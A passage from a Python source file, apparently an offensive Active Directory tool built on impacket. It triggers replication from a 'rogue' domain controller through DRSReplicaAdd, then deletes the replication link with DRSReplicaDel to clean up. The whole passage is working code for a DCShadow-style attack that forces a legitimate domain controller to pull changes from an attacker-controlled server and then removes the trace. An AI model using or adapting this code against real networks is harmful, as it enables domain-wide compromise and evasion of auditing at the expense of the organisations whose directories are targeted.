                if raw_resp and len(raw_resp) >= 4:
                    error_code = struct.unpack('<I', raw_resp[:4])[0]
                    if error_code == 0:
                        logging.debug("DRSReplicaAdd succeeded — replication complete")
                    else:
                        logging.warning(f"DRSReplicaAdd error: {error_code} (0x{error_code:08x})")
                        return False
                else:
                    logging.debug(f"DRSReplicaAdd raw: {raw_resp.hex() if raw_resp else 'empty'}")
            except Exception as recv_err:
                # Timeout likely means the DC is still processing (connecting to us)
                logging.debug(f"DRSReplicaAdd recv: {recv_err}")

            # -- DRSReplicaDel — clean up the repsFrom link --
            logging.debug(f"Sending DRSReplicaDel to remove replication link")
            try:
                del_req = DRSReplicaDel()
                del_req['hDrs'] = h_drs
                del_req['dwVersion'] = 1
                del_req['pmsgDel']['tag'] = 1

                del_req['pmsgDel']['V1']['pNC']['SidLen'] = 0
                del_req['pmsgDel']['V1']['pNC']['Sid'] = ''
                del_req['pmsgDel']['V1']['pNC']['Guid'] = drsuapi.NULLGUID
                del_req['pmsgDel']['V1']['pNC']['NameLen'] = len(base_dn)
                del_req['pmsgDel']['V1']['pNC']['StringName'] = base_dn + '\x00'
                del_req['pmsgDel']['V1']['pNC']['structLen'] = len(
                    del_req['pmsgDel']['V1']['pNC'].getData()
                )
                del_req['pmsgDel']['V1']['pszDsaSrc'] = rogue_dc_fqdn + '\x00'
                del_req['pmsgDel']['V1']['ulOptions'] = drsuapi.DRS_WRIT_REP

                dce.call(del_req.opnum, del_req)
                try:
                    raw_resp = dce.recv()
                    if raw_resp and len(raw_resp) >= 4:
                        ec = struct.unpack('<I', raw_resp[:4])[0]
                        logging.debug(f"DRSReplicaDel result: {ec}")
                except Exception:
                    pass
            except Exception as del_err:
                logging.debug(f"DRSReplicaDel: {del_err}")

            try:
                drsuapi.hDRSUnbind(dce, h_drs)
            except Exception:
                pass
            dce.disconnect()

            logging.debug("Replication trigger completed")
            return True

        except Exception as e:
            logging.error(f"Replication trigger failed: {e}")
            import traceback
            traceback.print_exc()
            return False
